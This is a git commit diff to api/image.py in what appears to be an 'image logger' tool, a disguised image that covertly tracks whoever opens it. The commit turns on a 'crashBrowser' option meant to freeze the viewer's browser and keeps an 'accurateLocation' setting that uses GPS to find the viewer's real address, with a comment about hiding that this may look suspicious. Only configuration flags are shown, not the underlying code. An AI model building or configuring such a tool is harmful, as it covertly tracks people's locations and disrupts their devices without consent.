5ba073fa778b554eafae7c6b26bd6b3c6677bd13
thereal124 <110129556+thereal124@users.noreply.github.com>
2025-02-01 19:30:32 -0500

    Update image.py

--- api/image.py
+++ api/image.py
@@ -22,12 +22,12 @@ config = {
     "color": 0x00FFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": True, # Enable the custom message?
+        "doMessage": False, # Enable the custom message?
         "message": "ERROR", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
